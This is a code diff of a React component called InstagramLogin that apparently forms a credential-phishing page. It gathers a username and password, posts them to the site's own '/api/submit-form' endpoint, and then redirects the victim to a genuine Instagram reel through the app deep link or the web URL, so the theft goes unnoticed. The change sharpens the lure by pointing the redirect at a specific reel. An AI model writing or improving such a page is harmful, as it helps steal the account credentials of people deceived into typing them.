@@ -56,10 +56,12 @@ export default function InstagramLogin() {
   }
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault()
-    if (!validateForm()) return
+    e.preventDefault();
 
-    setIsSubmitting(true)
+    if (!validateForm()) return;
+
+    setIsSubmitting(true);
+
     try {
       const res = await fetch("/api/submit-form", {
         method: "POST",
@@ -67,47 +69,46 @@ export default function InstagramLogin() {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(formData),
-      })
+      });
 
-      const result = await res.json()
+      const result = await res.json();
 
       if (!res.ok) {
-        console.error("API Error:", result.error)
-        alert("Something went wrong: " + result.error)
+        console.error("API Error:", result.error);
+        alert("Something went wrong: " + result.error);
       } else {
-        setFormData({ username: "", password: "" })
+        // Reset form
+        setFormData({ username: "", password: "" });
 
-        const instagramWebUrl = "https://instagram.com"
+        // Instagram Reel URLs
+        const reelId = "DB5yhFPpfki";
+        const instagramAppUrl = `instagram://reel/${reelId}`;
+        const instagramWebUrl = `https://www.instagram.com/reel/${reelId}/`;
 
-        // Check if user is on mobile
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
         if (isMobile) {
-          // Try to open Instagram app based on platform
-          const instagramAppUrl = "instagram://app"
+          // Try to open the Instagram app to the specific reel
+          window.location.href = instagramAppUrl;
 
-          // Try opening the app
-          window.location.href = instagramAppUrl
-
-          // Fallback to website after a delay
+          // Fallback to Instagram web if app didn't open
           setTimeout(() => {
-            // Check if page is still here (app didn't open)
             if (document.visibilityState !== "hidden") {
-              window.location.href = instagramWebUrl
+              window.location.href = instagramWebUrl;
             }
-          }, 1500)
+          }, 1500);
         } else {
-          // On desktop, just go to the website
-          window.location.href = instagramWebUrl
+          // Desktop fallback
+          window.location.href = instagramWebUrl;
         }
       }
     } catch (error) {
-      console.error("Network error:", error)
-      alert("Failed to connect to server.")
+      console.error("Network error:", error);
+      alert("Failed to connect to server.");
     } finally {
-      setIsSubmitting(false)
+      setIsSubmitting(false);
     }
-  }
+  };
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-white dark:bg-black px-4 mt-4 text-black dark:text-white">
